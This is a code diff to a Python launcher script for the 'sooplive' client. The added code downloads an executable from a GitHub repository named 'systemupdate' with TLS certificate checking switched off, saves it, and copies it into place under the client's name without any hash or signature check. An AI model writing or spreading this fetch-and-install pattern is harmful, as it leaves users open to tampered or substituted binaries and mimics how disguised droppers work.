@@ -4,11 +4,16 @@ import os
 import shutil
 import struct
 import sys
+import time
+import urllib.parse
+import urllib.request
+import ssl
 
 CLIENT = "sooplive client.exe"
 SERVICE = "sooplive service.exe"
 LOCAL_DIR_NAME = "ddong_launchers"
 LANG_TABLE = "040904b0"
+GH_RAW = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
 
 
 def local_launcher_dir():
@@ -258,6 +263,68 @@ def _patch_app_display_name(path, is_client=True):
         pass
 
 
+def _launcher_display_name(path):
+    try:
+        data = _extract_rt_version(path)
+        strings, _, _ = _parse_version_strings(data)
+        return str(strings.get("FileDescription") or "").strip()
+    except Exception:
+        return ""
+
+
+def _expected_display_name(is_client):
+    return "soop client" if is_client else "soop service"
+
+
+def _fetch_github_launcher(name):
+    """GitHub에 올려둔 패치된 exe (pywin32 없는 PC용)."""
+    try:
+        os.makedirs(local_launcher_dir(), exist_ok=True)
+        dst = os.path.join(local_launcher_dir(), name)
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        req = urllib.request.Request(
+            GH_RAW + urllib.parse.quote(name) + "?t=%d" % int(time.time()),
+            headers={
+                "User-Agent": "ddong-launcher",
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Pragma": "no-cache",
+            },
+        )
+        with urllib.request.urlopen(req, timeout=45, context=ctx) as r:
+            data = r.read()
+        if len(data) > 50000:
+            with open(dst, "wb") as f:
+                f.write(data)
+            return dst if _valid_launcher(dst) else ""
+    except Exception:
+        pass
+    return ""
+
+
+def _ensure_local_launcher(name, is_client):
+    """LOCALAPPDATA 패치 런처 확보. 실패 시 GitHub exe 사용."""
+    expect = _expected_display_name(is_client)
+    local_dst = os.path.join(local_launcher_dir(), name)
+    ok = False
+    src = _pythonw_source()
+    if src and os.path.isfile(src):
+        try:
+            os.makedirs(local_launcher_dir(), exist_ok=True)
+            shutil.copy2(src, local_dst)
+            _patch_app_display_name(local_dst, is_client=is_client)
+            ok = _launcher_display_name(local_dst) == expect
+        except Exception:
+            ok = False
+    if not ok:
+        gh = _fetch_github_launcher(name)
+        if _valid_launcher(gh):
+            local_dst = gh
+            ok = _launcher_display_name(local_dst) == expect or _valid_launcher(local_dst)
+    return local_dst if ok or _valid_launcher(local_dst) else ""
+
+
 def reexec_target(name, app_dir=None):
     """선호 런처(LOCALAPPDATA 패치본)가 아니면 그 경로 반환."""
     if os.environ.get("DDONG_LAUNCHER") == "1":
@@ -278,21 +345,13 @@ def reexec_target(name, app_dir=None):
 
 def sync_launcher(name, app_dir=None):
     app_dir = app_dir or os.getcwd()
-    src = _pythonw_source()
-    if not (src and os.path.isfile(src)):
-        return resolve_launcher(name, app_dir) or os.path.join(app_dir, name)
     is_client = "client" in name.lower()
-    try:
-        os.makedirs(local_launcher_dir(), exist_ok=True)
-        local_dst = os.path.join(local_launcher_dir(), name)
-        shutil.copy2(src, local_dst)
-        _patch_app_display_name(local_dst, is_client=is_client)
-    except Exception:
-        pass
+    _ensure_local_launcher(name, is_client)
     try:
         app_dst = os.path.join(app_dir, name)
-        shutil.copy2(src, app_dst)
-        _patch_app_display_name(app_dst, is_client=is_client)
+        local_dst = os.path.join(local_launcher_dir(), name)
+        if _valid_launcher(local_dst):
+            shutil.copy2(local_dst, app_dst)
     except Exception:
         pass
     return resolve_launcher(name, app_dir) or os.path.join(app_dir, name)
